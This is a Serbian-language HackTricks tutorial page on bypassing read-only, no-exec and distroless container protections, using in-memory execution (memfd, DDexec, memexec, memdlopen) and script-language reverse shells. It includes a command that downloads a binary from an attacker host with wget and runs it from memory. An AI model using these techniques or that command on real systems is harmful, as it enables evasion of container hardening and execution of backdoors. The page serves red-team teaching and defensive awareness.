# Bypass FS protections: read-only / no-exec / Distroless

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="https://github.com/carlospolop/hacktricks/blob/rs/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

Ako vas zanima **hakerska karijera** i hakovanje neuhvatljivog - **zapošljavamo!** (_potrebno je tečno poznavanje pisanog i govornog poljskog jezika_).

{% embed url="https://www.stmcyber.com/careers" %}

## Video zapisi

U sledećim video zapisima možete pronaći tehnike pomenute na ovoj stranici objašnjene detaljnije:

* [**DEF CON 31 - Istraživanje manipulacije memorijom Linuxa za prikrivanje i izbegavanje**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Skriveni upadi sa DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Scenario samo za čitanje / bez izvršavanja

Sve je češće naići na linux mašine montirane sa **zaštitom fajl sistema samo za čitanje (ro)**, posebno u kontejnerima. To je zato što je pokretanje kontejnera sa ro fajl sistemom jednostavno postavljanjem **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i ako je fajl sistem montiran kao ro, **`/dev/shm`** će i dalje biti upisiv, tako da nije tačno da ne možemo pisati ništa na disk. Međutim, ovaj folder će biti **montiran sa zaštitom bez izvršavanja**, pa ako preuzmete binarni fajl ovde, **nećete moći da ga izvršite**.

{% hint style="warning" %}
Sa perspektive crvenog tima, ovo otežava **preuzimanje i izvršavanje** binarnih fajlova koji nisu već prisutni u sistemu (kao što su backdoor-ovi ili enumeratori poput `kubectl`).
{% endhint %}

## Najlakši način zaobilaženja: Skripte

Imajte na umu da sam spomenuo binarne fajlove, možete **izvršiti bilo koju skriptu** sve dok je interpretator unutar mašine, poput **shell skripte** ako je `sh` prisutan ili **python skripte** ako je instaliran `python`.

Međutim, ovo nije dovoljno da biste izvršili vaš binarni backdoor ili druge binarne alate koje možda treba pokrenuti.

## Bypass memorije

Ako želite da izvršite binarni fajl, ali fajl sistem to ne dozvoljava, najbolji način je **izvršiti ga iz memorije**, jer se **zaštite ne primenjuju tamo**.

### FD + exec syscall bypass

Ako imate moćne skriptne motore unutar mašine, poput **Python-a**, **Perla** ili **Ruby-ja**, možete preuzeti binarni fajl za izvršavanje iz memorije, sačuvati ga u deskriptoru fajla u memoriji (`create_memfd` syscall), što neće biti zaštićeno tim zaštitama, a zatim pozvati **`exec` syscall** navodeći **fd kao fajl za izvršavanje**.

Za ovo možete lako koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binarni fajl i on će generisati skriptu na naznačenom jeziku sa **binarnim fajlom kompresovanim i b64 enkodiranim** sa instrukcijama za **dekodiranje i dekompresovanje** u **fd** kreiran pozivom `create_memfd` syscall i poziv **exec** syscall-a za pokretanje.

{% hint style="warning" %}
Ovo ne funkcioniše u drugim skriptnim jezicima poput PHP-a ili Node-a jer nemaju **podrazumevan način pozivanja sirovih syscalls** iz skripte, pa nije moguće pozvati `create_memfd` da kreirate **memorijski fd** za čuvanje binarnog fajla.

Osim toga, kreiranje **regularnog fd** sa fajlom u `/dev/shm` neće raditi, jer vam neće biti dozvoljeno da ga pokrenete zbog primene **zaštite bez izvršavanja**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **modifikujete memoriju vašeg sopstvenog procesa** tako što ćete prebrisati njegov **`/proc/self/mem`**.

Stoga, **kontrolišući asemblerski kod** koji se izvršava od strane procesa, možete napisati **shellcode** i "mutirati" proces da **izvrši bilo koji proizvoljni kod**.

{% hint style="success" %}
**DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** svoj sopstveni **shellcode** ili **bilo koji binarni fajl** iz **memorije**.
{% endhint %}

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Za više informacija o ovoj tehnici pogledajte Github ili:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je prirodni sledeći korak nakon DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite **pokrenuti drugi binarni fajl** ne morate ponovo pokretati DDexec, već možete jednostavno pokrenuti memexec shellcode putem DDexec tehnike i zatim **komunicirati sa ovim demonom kako biste prosledili nove binarne fajlove za učitavanje i pokretanje**.

Možete pronaći primer kako koristiti **memexec za izvršavanje binarnih fajlova iz PHP reverse shell-a** na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnim ciljem kao DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **jednostavniji način učitavanja binarnih fajlova** u memoriju kako bi ih kasnije izvršili. To bi čak moglo omogućiti učitavanje binarnih fajlova sa zavisnostima.

## Bypass Distroless

### Šta je distroless

Distroless kontejneri sadrže samo **apsolutno neophodne komponente za pokretanje određene aplikacije ili servisa**, poput biblioteka i zavisnosti za izvršavanje, ali isključuju veće komponente poput upravljača paketima, ljuske ili sistemskih alatki.

Cilj distroless kontejnera je **smanjenje površine napada kontejnera eliminisanjem nepotrebnih komponenti** i minimiziranje broja ranjivosti koje mogu biti iskorišćene.

### Reverse Shell

U distroless kontejneru možda **nećete čak ni pronaći `sh` ili `bash`** da biste dobili običnu ljusku. Takođe nećete pronaći binarne fajlove poput `ls`, `whoami`, `id`... sve što obično pokrećete na sistemu.

{% hint style="warning" %}
Stoga, **nećete** moći dobiti **reverse shell** ili **enumerisati** sistem kao što obično radite.
{% endhint %}

Međutim, ako kompromitovani kontejner pokreće na primer flask veb, tada je instaliran python, i stoga možete dobiti **Python reverse shell**. Ako pokreće node, možete dobiti Node rev shell, i isto važi za većinu bilo koje **skripting jezike**.

{% hint style="success" %}
Korišćenjem skriptnog jezika možete **enumerisati sistem** koristeći mogućnosti jezika.
{% endhint %}

Ako ne postoje **zaštite `read-only/no-exec`** možete zloupotrebiti svoj reverse shell da **pišete u fajl sistem vaše binarne fajlove** i **izvršite** ih.

{% hint style="success" %}
Međutim, u ovakvim kontejnerima ove zaštite obično postoje, ali možete koristiti **prethodne tehnike izvršavanja u memoriji da ih zaobiđete**.
{% endhint %}

Možete pronaći **primere** kako **iskoristiti neke RCE ranjivosti** da biste dobili **reverse shell-ove skripting jezika** i izvršili binarne fajlove iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="https://github.com/carlospolop/hacktricks/blob/rs/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i hakovanje neuhvatljivog - **zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika u pisanju i govoru_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite videti svoju **kompaniju reklamiranu u HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijumima.

</details>
